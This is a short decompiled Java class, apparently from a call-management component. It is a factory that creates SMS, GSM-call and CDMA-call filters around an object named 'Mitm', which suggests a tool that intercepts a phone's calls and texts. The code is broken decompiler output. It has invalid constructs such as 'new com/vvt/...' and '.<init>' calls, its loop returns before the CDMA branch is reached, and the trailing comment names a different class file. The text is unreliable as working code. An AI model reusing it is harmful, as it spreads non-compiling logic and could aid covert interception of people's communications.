package com.vvt.callmanager.filter;

import android.content.Context;

import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.a.m;
import com.vvt.network.NetworkServiceInfo.Type;

public class f
{
  public static n a(Context paramContext, Mitm paramf, m paramm)
  {
    FilterSms localFilterSms = new com/vvt/callmanager/filter/FilterSms;
    localFilterSms.<init>(paramContext, paramf, paramm);
    return localFilterSms;
  }
  
  public static n a(NetworkServiceInfo.Type paramType, Context paramContext, Mitm paramf, m paramm)
  {
    Object localObject = null;
    NetworkServiceInfo.Type localType = NetworkServiceInfo.Type.GSM;
    if (paramType == localType)
    {
      localObject = new com/vvt/callmanager/filter/FilterGsmCall;
      ((FilterGsmCall)localObject).<init>(paramContext, paramf, paramm);
    }
    for (;;)
    {
      return (n)localObject;
      localType = NetworkServiceInfo.Type.CDMA;
      if (paramType == localType)
      {
        localObject = new com/vvt/callmanager/filter/FilterCdmaCall;
        ((FilterCdmaCall)localObject).<init>(paramContext, paramf, paramm);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/Mitm.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */